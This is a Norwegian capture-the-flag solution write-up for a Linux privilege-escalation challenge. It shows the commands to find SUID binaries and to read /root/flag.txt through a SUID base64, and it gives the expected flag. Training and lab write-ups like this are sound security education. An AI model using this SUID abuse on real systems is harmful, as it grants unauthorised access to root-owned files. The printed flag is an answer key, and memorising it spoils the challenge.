# Servicekontoen - Løsningsgang

Oppgaven er en klassisk Linux privilege escalation over SSH. Deltakeren har
kun brukeren `ctfplayer`, mens flagget ligger i `/root/flag.txt`.

## Fremgangsmåte

1. Logg inn med informasjonen fra CTFd:

   ```bash
   ssh ctfplayer@<host> -p <port>
   ```

2. Bekreft at brukeren ikke er root:

   ```bash
   id
   ls -la /root /root/flag.txt
   ```

3. Finn SUID-binærer:

   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```

4. Legg merke til at `/usr/bin/base64` har SUID-bit. På GTFOBins finnes
   `base64` under SUID, og verktøyet kan lese en fil med binærens effektive
   privilegier.

5. Les flagget:

   ```bash
   base64 /root/flag.txt | base64 -d
   ```

Forventet flagg:

```text
CTF{suid_b4se64_reads_r00t}
```
